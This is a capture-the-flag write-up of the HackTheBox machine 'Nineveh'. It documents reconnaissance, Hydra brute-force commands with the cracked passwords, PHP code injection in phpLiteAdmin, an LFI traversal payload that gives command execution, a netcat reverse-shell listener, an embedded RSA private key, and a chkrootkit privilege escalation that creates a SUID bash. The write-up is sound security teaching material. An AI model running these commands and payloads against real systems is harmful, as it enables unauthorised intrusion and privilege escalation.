# Nineveh - Medium

Target IP: **10.129.77.128**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.77.128 -v```

Output shows port 80 and 443 running Apache 2.4.18.

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182:94b8:0210:7992:bf01:e802:b26f:8639
|_SHA-1: 2275:b03e:27bd:1226:fdaa:8b0f:6de9:84f0:113b:42c0
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).

NSE: Script Post-scanning.
Initiating NSE at 09:22
Completed NSE at 09:22, 0.00s elapsed
Initiating NSE at 09:22
Completed NSE at 09:22, 0.00s elapsed
Initiating NSE at 09:22
Completed NSE at 09:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.82 seconds
           Raw packets sent: 131169 (5.771MB) | Rcvd: 218 (14.416KB)
```

Let's navigate to it.

We are greeted with the default installation page of Apache.

![1](Screenshots/N_1/jpg)

Navigating to port 443 gives us something different, a static image.

![2](Screenshots/N_2.jpg)

Let's perform extra enumeration for both the ports.

For ```http://```, we get a single hit for ```/department```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-t0suv86mnu]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.129.77.128/FUZZ -ic 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.77.128/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 178, Words: 22, Lines: 6, Duration: 8ms]
department              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 6ms]
                        [Status: 200, Size: 178, Words: 22, Lines: 6, Duration: 7ms]
:: Progress: [87651/87651] :: Job [1/1] :: 5882 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

Another wordlist gets us more hits.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-t0suv86mnu]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.129.77.128/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.77.128/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 178, Words: 22, Lines: 6, Duration: 7ms]
info.php                [Status: 200, Size: 83754, Words: 4051, Lines: 978, Duration: 34ms]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 2111ms]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 2111ms]
.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 2130ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 7ms]
:: Progress: [4750/4750] :: Job [1/1] :: 67 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

For ```https://```, we get a single hit for ```/db```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-t0suv86mnu]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://10.129.77.128/FUZZ -ic -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.77.128/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 6ms]
db                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 7ms]
                        [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 7ms]
:: Progress: [87651/87651] :: Job [1/1] :: 6060 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

Other hits on another wordlists we are forbidden to view.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-t0suv86mnu]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u https://10.129.77.128/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.77.128/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 6ms]
.hta                    [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 6ms]
.htaccess               [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 6ms]
db                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 6ms]
index.html              [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 6ms]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 6ms]
:: Progress: [4750/4750] :: Job [1/1] :: 5714 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Navigating to ```/department``` leads us to a login page for the Nineveh Department.

![3](Screenshots/N_3.jpg)

```/info.php``` gets us the output of ```phpinfo()```. The version of php running is 7.0.18. We should note that there are disabled functions: ```pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,```

![4](Screenshots/N_4.jpg)

```/db``` on ```https://``` leads us to another login page, this time for phpLiteAdmin version 1.9.

![5](Screenshots/N_5.jpg)

Given these, I believe we get a set of credentials from the database, ```/db```, then use it to log into the department page.

Let's look for any publicly disclosed vulnerabilities for phpLiteAdmin version 1.9.

A search online reveals that it is vulnerable to SQLi and PHP code injection vulnerability.

First, we need to log in. The default password, ```admin```, does not work. Let's try brute forcing with Hydra.

It finds us a valid password.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-t0suv86mnu]─[~]
└──╼ [★]$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.77.128 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-08 09:58:36
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://10.129.77.128:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[443][http-post-form] host: 10.129.77.128   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-08 09:59:12
```

We log in successfully, leading us to the admin page.

![6](Screenshots/N_6.jpg)

Let's now try the PHP code injection vulnerability.

First, we create a db with a ```.php``` file extension.

![7](Screenshots/N_7.jpg)

Then, we create a table inside the database and insert a text field with the default value containing the php code.

![8](Screenshots/N_8.jpg)

However, we lack the ability to navigate to the ```.php``` to execute it.

Let's look elsewhere. We haven't looked at the ```/department``` log in page yet.

The log in page seems to give different responses. For the username ```admin```, it tells us that we provided an invalid password.

![9](Screenshots/N_9.jpg)

However, for the username ```hi```, it tells us that our username is invalid.

![10](Screenshots/N_10.jpg)

So we know that ```admin``` is a valid username. Let's try brute forcing again on this log in page.

We find the password for ```admin```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-t0suv86mnu]─[~]
└──╼ [★]$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.77.128 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-08 10:11:36
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.129.77.128:80/department/login.php:username=^USER^&password=^PASS^:Invalid password
[STATUS] 4003.00 tries/min, 4003 tries in 00:01h, 14340396 to do in 59:43h, 16 active
[80][http-post-form] host: 10.129.77.128   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-08 10:12:54
```

We successfuly login, and are redirected to ```/manage.php```.

![11](Screenshots/N_11.jpg)

The notes section seems to be pulling a ```.txt``` file from the back end. We also get a potential user, ```amrois```.

![12](Screenshots/N_12.jpg)

Perhaps we can pull the ```.php``` file that we uploaded through LFI on the file parameter here. We know that the path is ```/var/tmp/hack.php```.

Trying ```?notes=files/../../../../../var/tmp/hack.php``` payload just displays "No Note Selected."

However, including ```ninevehNotes``` with ```?notes=files/ninevehNotes.txt/../../../../../var/tmp/hack.php?cmd=id``` gives us another message saying the file name is too long.

It seems like it just checks for ```ninevehNotes``` in the file parameter.

With ```?notes=/ninevehNotes/../var/tmp/hack.php?cmd=id```, we get code execution.

![13](Screenshots/N_13.jpg)

Now we can switch the command to get a shell.

After doing this, we catch a shell as ```www-data```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-t0suv86mnu]─[~]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.78.1 46688
bash: cannot set terminal process group (1393): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ whoami
whoami
www-data
```

There is an ```amrois``` user in ```/home```.

```
www-data@nineveh:/var/www/html/department$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Jul  2  2017 .
drwxr-xr-x 24 root   root   4096 Jan 29  2021 ..
drwxr-xr-x  4 amrois amrois 4096 Dec 17  2020 amrois
```

Reusing the password we found doesn't work.

Running linpeas gets us something very interesting.

```
══╣ Possible private SSH keys were found!
/var/www/ssl/secure_notes/nineveh.png
```

Running strings on the image reveals that a private key was stored inside the image.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

We can save this into a file, and use it to connect to ssh, which is listening on localhost.

We're in!

```
www-data@nineveh:/dev/shm$ ssh -i id_rsa amrois@127.0.0.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ whoami
amrois
```

We can proceed to get the user flag from here.

## Root Flag

There is a bash script being called by a cron job.

```
amrois@nineveh:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/10 * * * * /usr/sbin/report-reset.sh
```

Looking at the contents, it erases all ```.txt``` files inside ```/report```.

```
amrois@nineveh:/report$ cat /usr/sbin/report-reset.sh 
#!/bin/bash

rm -rf /report/*.txt
```

```/report``` is unusual. This contains reports which seem like are generated by another cron job. perhaps ran as ```root```.

```
amrois@nineveh:/report$ ls -la
total 32
drwxr-xr-x  2 amrois amrois 4096 Oct  8 11:22 .
drwxr-xr-x 24 root   root   4096 Jan 29  2021 ..
-rw-r--r--  1 amrois amrois 4806 Oct  8 11:20 report-26-10-08:11:20.txt
-rw-r--r--  1 amrois amrois 4806 Oct  8 11:21 report-26-10-08:11:21.txt
-rw-r--r--  1 amrois amrois 4806 Oct  8 11:22 report-26-10-08:11:22.txt
```

Running pspy reveals a flurry of calls to chkrootkit as ```root```. I'm guessing that the output of this is saved into ```/reports```.

```
2026/10/08 11:32:01 CMD: UID=0     PID=29802  | /usr/sbin/CRON -f 
2026/10/08 11:32:01 CMD: UID=0     PID=29803  | /usr/sbin/CRON -f 
2026/10/08 11:32:01 CMD: UID=0     PID=29804  | /bin/bash /root/vulnScan.sh 
2026/10/08 11:32:01 CMD: UID=0     PID=29806  | date +%y-%m-%d:%H:%M 
2026/10/08 11:32:01 CMD: UID=0     PID=29805  | /bin/bash /root/vulnScan.sh 
2026/10/08 11:32:01 CMD: UID=0     PID=29809  | sed -e s/:/ /g 
2026/10/08 11:32:01 CMD: UID=0     PID=29808  | /bin/sh /usr/bin/chkrootkit 
2026/10/08 11:32:01 CMD: UID=0     PID=29807  | /bin/sh /usr/bin/chkrootkit 
2026/10/08 11:32:01 CMD: UID=0     PID=29823  | /bin/uname -s 
2026/10/08 11:32:01 CMD: UID=0     PID=29824  | /bin/sh /usr/bin/chkrootkit 
2026/10/08 11:32:01 CMD: UID=0     PID=29825  | /bin/ps ax 
2026/10/08 11:32:01 CMD: UID=0     PID=29829  | /bin/sh /usr/bin/chkrootkit 
2026/10/08 11:32:01 CMD: UID=0     PID=29828  | /bin/sh /usr/bin/chkrootkit 
2026/10/08 11:32:01 CMD: UID=0     PID=29827  | /bin/sh /usr/bin/chkrootkit 
2026/10/08 11:32:01 CMD: UID=0     PID=29826  | /bin/sh /usr/bin/chkrootkit 
```

There is a vulnerability that affects chkrootkit. If we place a ```/tmp/update``` file, chkrootkit will execute whatever is in that file. In that case, we can simply place a somem malicious code inside it and wait for the cron job to execute.

Let's create a copy of the bash binary with the SUID bit set.

```
amrois@nineveh:/tmp$ nano update
amrois@nineveh:/tmp$ cat update
#!/bin/bash

cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
amrois@nineveh:/tmp$ chmod +x update 
```

After waiting a minute, our copy is created. We can run it to get root.

```
amrois@nineveh:/tmp$ ls
linpeas.sh
systemd-private-e003c4ad57794ed9868e528443505fc6-systemd-timesyncd.service-DzwVRG
tmux-1000
tmux-33
update
vmware-root
amrois@nineveh:/tmp$ nano update 
amrois@nineveh:/tmp$ nano update
amrois@nineveh:/tmp$ cat update
#!/bin/bash

cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
amrois@nineveh:/tmp$ ls
bash
linpeas.sh
systemd-private-e003c4ad57794ed9868e528443505fc6-systemd-timesyncd.service-DzwVRG
tmux-1000
tmux-33
update
vmware-root
amrois@nineveh:/tmp$ /tmp/bash -p
bash-4.3# whoami
root
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
